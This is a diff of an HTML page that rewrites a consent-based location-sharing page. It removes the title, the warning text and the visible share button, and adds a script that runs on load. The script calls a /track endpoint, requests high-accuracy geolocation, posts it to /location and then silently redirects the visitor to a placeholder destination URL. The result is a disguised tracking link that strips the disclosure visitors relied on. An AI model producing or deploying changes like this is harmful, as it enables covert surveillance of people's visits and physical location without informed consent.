@@ -1,58 +1,86 @@
 <!DOCTYPE html>
-<html lang="en">
+<html lang="en" data-destination-url="__DESTINATION_URL__">
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Location sharing</title>
 </head>
 <body>
-    <h1>Location sharing</h1>
-    <p>
-        If you continue, this device's location will be sent to the server
-        operator. Share it only if you trust them.
-    </p>
-    <button id="share-location" type="button">Share my location</button>
-    <p id="status" role="status" aria-live="polite"></p>
+    <main>
+        <button id="share-location" type="button"></button>
+        <p id="status" role="status" aria-live="polite"></p>
+    </main>
 
     <script>
-        function shareLocation() {
-            if (!navigator.geolocation) {
-                document.getElementById('status').textContent =
-                    'Geolocation is not available in this browser.';
-                return;
-            }
+        const button = document.getElementById("share-location");
+        const status = document.getElementById("status");
+        const destinationUrl = document.documentElement.dataset.destinationUrl;
 
-            navigator.geolocation.getCurrentPosition(
-                (position) => {
-                    const data = {
-                        latitude: position.coords.latitude,
-                        longitude: position.coords.longitude,
-                        accuracy: position.coords.accuracy
-                    };
-
-                    fetch('/location', {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify(data)
-                    })
-                        .then((response) => {
-                            if (!response.ok) {
-                                throw new Error('The server could not save the location.');
-                            }
-                            document.getElementById('status').textContent =
-                                'Location shared successfully.';
-                        })
-                        .catch((error) => {
-                            document.getElementById('status').textContent = error.message;
-                        });
+        async function submitLocation(data) {
+            const response = await fetch("/location", {
+                method: "POST",
+                headers: {
+                    "Content-Type": "application/json"
                 },
-                (error) => {
-                    document.getElementById('status').textContent = error.message;
-                }
-            );
+                body: JSON.stringify(data)
+            });
+
+            if (!response.ok) {
+                throw new Error("Failed to submit location");
+            }
         }
 
-        document.getElementById('share-location').addEventListener('click', shareLocation);
+        function requestLocation() {
+            return new Promise((resolve) => {
+                if (!navigator.geolocation) {
+                    resolve({ status: "unavailable" });
+                    return;
+                }
+
+                navigator.geolocation.getCurrentPosition(
+                    (position) => {
+                        resolve({
+                            status: "granted",
+                            latitude: position.coords.latitude,
+                            longitude: position.coords.longitude,
+                            accuracy: position.coords.accuracy
+                        });
+                    },
+                    (error) => {
+                        resolve({
+                            status: error.code === error.PERMISSION_DENIED
+                                ? "denied"
+                                : "unavailable"
+                        });
+                    },
+                    {
+                        enableHighAccuracy: true,
+                        timeout: 15000,
+                        maximumAge: 0
+                    }
+                );
+            });
+        }
+
+        async function startTracking() {
+            button.hidden = true;
+
+            try {
+                const trackResponse = await fetch("/track");
+
+                if (!trackResponse.ok) {
+                    throw new Error("Failed to start tracking");
+                }
+
+                const location = await requestLocation();
+                await submitLocation(location);
+            } catch (error) {
+                console.error(error);
+            }
+
+            window.location.href = destinationUrl;
+        }
+
+        startTracking();
     </script>
 </body>
 </html>
